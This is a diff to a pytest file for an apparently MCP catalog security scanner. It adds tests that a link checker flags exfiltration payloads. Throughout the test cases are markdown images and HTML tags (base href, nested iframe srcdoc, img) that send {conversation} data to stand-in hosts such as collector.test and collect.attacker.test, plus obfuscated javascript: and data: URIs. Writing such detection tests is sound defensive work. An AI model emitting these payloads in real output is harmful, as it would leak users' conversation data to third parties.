@@ -29,6 +29,7 @@ from mcpscore.rules import (
 from mcpscore.rules.base import SKIP_REASON_INSUFFICIENT_DATA
 from mcpscore.rules.catalog_security import (
     MAX_LINK_MARKDOWN_BYTES,
+    MAX_SRCDOC_DEPTH,
     catalog_texts,
     exfiltration_link_classes,
     hidden_unicode_classes,
@@ -263,6 +264,23 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<form action='https://api.test/users/{id}'></form>", []),
         ("<div data='https://a.test/{x}.png' title='x'>", []),
         ("<span href='javascript:alert(1)'>text</span>", []),
+        ("prefix <script>x ![a](https://collector.test/{c}.png) </script>", []),
+        ("<template><img src='https://collector.test/{c}.png'></template> then ![b](https://a.test/b.png)", []),
+        (
+            "<template><img src='https://a.test/a.png'></template> ![b](https://collector.test/{c}.png)",
+            ["exfiltration_query"],
+        ),
+        ("<base href='https://collector.test/'><img src='/{c}.png'>", ["exfiltration_query"]),
+        ("<img src='/{c}.png'><base href='https://collector.test/'>", ["exfiltration_query"]),
+        ("<img src='/{c}.png'>", []),
+        (
+            (
+                "<iframe srcdoc='&lt;base href=&quot;https://collector.test/&quot;&gt;"
+                "&lt;img src=&quot;/{c}.png&quot;&gt;'>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<base href='https://['><img src='/{c}.png'>", []),
         ("<link rel='canonical' href='https://a.test/{c}'>", []),
         ("<link rel='Stylesheet alternate' href='https://collector.test/{c}.css'>", ["exfiltration_query"]),
         ("<link rel='preload' as='style' imagesrcset='https://collector.test/{c}.png'>", []),
@@ -294,39 +312,39 @@ def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
 
 
 @pytest.mark.parametrize(
-    ("tail", "expected"),
+    "tail",
     [
-        ("![x](https://a.test/{conversation}.png)", ["exfiltration_query"]),
-        ("[a](&#106;avascript:alert(1))", ["script_uri"]),
-        ("[b](jav%09ascript:alert(1))", ["script_uri"]),
-        ("see https://docs.test/a and nothing to fill", []),
-        ("![x](https://collector.test/p(1)?d={conversation})", ["exfiltration_query"]),
-        ("![x](https://collector.test/p%28%29?d={conversation})", ["exfiltration_query"]),
-        ("![x](https://[::1]/{conversation}.png)", ["exfiltration_query"]),
-        ("[d](data:text/html,x) ![e](data:image/png;base64,AA)", ["data_uri"]),
-        ("![e](data:image/png;base64,AA)", []),
-        ("\ud800 [q](https://a.test/?q={d})", ["exfiltration_query"]),
-        ("<a href='da&#9;ta:text/html,hello'>open</a>", ["data_uri"]),
-        ("Metadata: see [docs](https://docs.example.com)", []),
-        (
-            "<iframe srcdoc='&lt;img src=&quot;https://collector.test/?d=&amp;#123;c&amp;#125;&quot;&gt;'>",
-            ["exfiltration_query"],
-        ),
-        ("<iframe srcdoc='&lt;a href=&quot;jav&amp;#97;script:x&quot;&gt;'>", ["script_uri"]),
-        ("![x](https://collector.test/p.png?u=$ID)", ["exfiltration_query"]),
-        ("<img src='\\\\collector.test\\{conversation}.png'>", ["exfiltration_query"]),
+        "![x](https://a.test/{conversation}.png)",
+        "[a](&#106;avascript:alert(1))",
+        "[b](jav%09ascript:alert(1))",
+        "![x](https://collector.test/p(1)?d={conversation})",
+        "![x](https://collector.test/p%28%29?d={conversation})",
+        "![x](https://[::1]/{conversation}.png)",
+        "[d](data:text/html,x) ![e](data:image/png;base64,AA)",
+        "![e](data:image/png;base64,AA)",
+        "\ud800 [q](https://a.test/?q={d})",
+        "<a href='da&#9;ta:text/html,hello'>open</a>",
+        "Metadata: see [docs](https://docs.example.com)",
+        "<iframe srcdoc='&lt;a href=&quot;jav&amp;#97;script:x&quot;&gt;'>",
+        "![x](https://collector.test/p.png?u=$ID)",
+        "<img src='\\\\collector.test\\{conversation}.png'>",
     ],
 )
-def test_oversized_text_keeps_image_and_encoded_scheme_checks(tail: str, expected: list[str]) -> None:
-    assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " " + tail) == expected
-
-
-def test_oversized_text_is_scanned_without_markdown_parsing() -> None:
-    padding = "![a](" * (MAX_LINK_MARKDOWN_BYTES // 5 + 1)
-    text = padding + " [x](javascript:y) [q](https://a.test/?a={b}) ![p](data:image/png;base64,AA)"
+def test_oversized_text_with_markup_fails_as_uncheckable(tail: str) -> None:
     started = time.perf_counter()
-    assert exfiltration_link_classes(text) == ["script_uri", "exfiltration_query"]
+    assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " " + tail) == ["uncheckable_markup"]
     assert time.perf_counter() - started < 5
+
+
+def test_oversized_text_without_markup_passes() -> None:
+    assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " see https://docs.test/a {limit}") == []
+
+
+def test_markup_just_under_the_limit_is_parsed() -> None:
+    tail = " ![x](https://collector.test/{c}.png)"
+    text = "x" * (MAX_LINK_MARKDOWN_BYTES - len(tail)) + tail
+    assert exfiltration_link_classes(text) == ["exfiltration_query"]
+    assert exfiltration_link_classes(text + "x") == ["uncheckable_markup"]
 
 
 def full_catalog(marker: str, key: str | None = None) -> AuditData:
@@ -577,23 +595,21 @@ def test_an_exfiltration_link_used_as_a_schema_key_is_not_echoed() -> None:
     assert "attacker" not in json.dumps(result.to_dict())
 
 
-def test_nested_srcdoc_is_followed_at_every_depth_that_fits() -> None:
+def test_nested_srcdoc_is_followed_to_its_limit_and_fails_beyond() -> None:
     def nest(html: str, levels: int) -> str:
         for _ in range(levels):
             html = "<iframe srcdoc='" + html.replace("&", "&amp;").replace("'", "&#39;").replace("<", "&lt;") + "'>"
         return html
 
     image = "<img src='https://collector.test/{c}.png'>"
-    depth = 1
-    while len(nest(image, depth + 1).encode("utf-8")) <= MAX_LINK_MARKDOWN_BYTES:
-        depth += 1
-    assert depth >= 4
-    started = time.perf_counter()
-    assert exfiltration_link_classes(nest(image, depth)) == ["exfiltration_query"]
-    assert time.perf_counter() - started < 5
+    assert exfiltration_link_classes(nest(image, MAX_SRCDOC_DEPTH)) == ["exfiltration_query"]
+    assert exfiltration_link_classes(nest("<a href='jav&#97;script:x'>open</a>", 13)) == ["uncheckable_markup"]
+    assert exfiltration_link_classes(nest("<a href='https://a.test/'>open</a>", MAX_SRCDOC_DEPTH + 1)) == [
+        "uncheckable_markup"
+    ]
 
 
-def test_repeated_escaping_in_oversized_text_is_decoded_in_bounded_time() -> None:
+def test_repeated_escaping_is_handled_in_bounded_time() -> None:
     text = "&" + "amp;" * (MAX_LINK_MARKDOWN_BYTES // 2) + "#123;c} <a href='https://a.test/'>"
     started = time.perf_counter()
     exfiltration_link_classes(text)
